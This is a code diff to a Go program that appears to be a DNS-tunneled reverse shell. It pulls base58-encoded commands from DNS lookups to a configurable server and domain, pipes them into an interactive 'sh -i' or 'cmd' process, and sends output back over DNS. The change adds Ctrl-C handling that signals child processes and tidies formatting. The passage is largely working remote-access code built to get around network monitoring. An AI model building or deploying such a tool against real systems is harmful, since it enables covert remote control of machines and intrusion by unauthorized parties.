@@ -12,17 +12,20 @@ import (
 	"os/exec"
 	"runtime"
 	"strings"
+	"syscall"
 	"time"
 
 	"github.com/btcsuite/btcutil/base58"
+	"github.com/shirou/gopsutil/process"
 )
+
 func main() {
 	host := os.Getenv("DNS_SERVER")
-	if host == ""{
+	if host == "" {
 		host = "127.0.0.1:53"
 	}
 	dnsDomain := os.Getenv("DNS_DOMAIN")
-	if dnsDomain == ""{
+	if dnsDomain == "" {
 		dnsDomain = "example.com"
 	}
 	fmt.Printf("Connecting to %s\n", host)
@@ -50,14 +53,16 @@ type Shell struct {
 	stdOut chan []byte
 	stdIn  chan string
 
+	cmd *exec.Cmd
+
 	domainCmd string
 	domainOut string
 
 	cmdStdoutReader *io.PipeReader
 	cmdStdoutWriter *io.PipeWriter
 
-	cmdStdinReader  *io.PipeReader
-	cmdStdinWriter  *io.PipeWriter
+	cmdStdinReader *io.PipeReader
+	cmdStdinWriter *io.PipeWriter
 }
 
 func (s *Shell) Init(domain string) {
@@ -81,9 +86,27 @@ func (s *Shell) FetchStdin(r *net.Resolver) {
 		}
 		if len(data) > 0 && data[0] != "" {
 			fmt.Printf("Received: %v, %d\n", data, len(data))
-			command := string(base58.Decode(data[0]))
-			command += "\n"
-			s.stdIn <- command
+			command := base58.Decode(data[0])
+
+			//Catch ctrl-c and signal the process
+			if len(command) > 0 && command[0] == 0x03 {
+				parent, err := process.NewProcess(int32(s.cmd.Process.Pid))
+				if err == nil {
+					children, err := parent.Children()
+					if err == nil {
+						for _, child := range children {
+							if runtime.GOOS == "windows"{
+								child.Terminate()
+							}
+							syscall.Kill(int(child.Pid), syscall.SIGINT)
+						}
+					}
+				}
+			} else {
+				strCommand := string(command)
+				strCommand += "\n"
+				s.stdIn <- strCommand
+			}
 		}
 		time.Sleep(1 * time.Second)
 	}
@@ -114,7 +137,7 @@ func (s *Shell) Execute() {
 			commandInput := <-s.stdIn
 			fmt.Println("Write data to stdin")
 			_, err := s.cmdStdinWriter.Write([]byte(commandInput))
-			if err != nil{
+			if err != nil {
 				fmt.Println(err)
 				return
 			}
@@ -126,7 +149,7 @@ func (s *Shell) Execute() {
 	go func() {
 		for {
 			n, err := s.cmdStdoutReader.Read(stdoutData)
-			if err != nil{
+			if err != nil {
 				fmt.Println(err)
 				return
 			}
@@ -137,18 +160,17 @@ func (s *Shell) Execute() {
 
 func (s *Shell) startShell() {
 	fmt.Println("Launching bash/cmd process")
-	var cmd *exec.Cmd
 	if runtime.GOOS == "windows" {
-		cmd = exec.Command("cmd")
-	}else{
-		cmd = exec.Command("sh","-i")
+		s.cmd = exec.Command("cmd")
+	} else {
+		s.cmd = exec.Command("sh", "-i")
 	}
 
-	cmd.Stdin = s.cmdStdinReader
-	cmd.Stdout = s.cmdStdoutWriter
-	cmd.Stderr = s.cmdStdoutWriter
+	s.cmd.Stdin = s.cmdStdinReader
+	s.cmd.Stdout = s.cmdStdoutWriter
+	s.cmd.Stderr = s.cmdStdoutWriter
 
-	cmd.Start()
+	s.cmd.Start()
 }
 
 func (s *Shell) encodeRequests(cmdOutput []byte) []string {
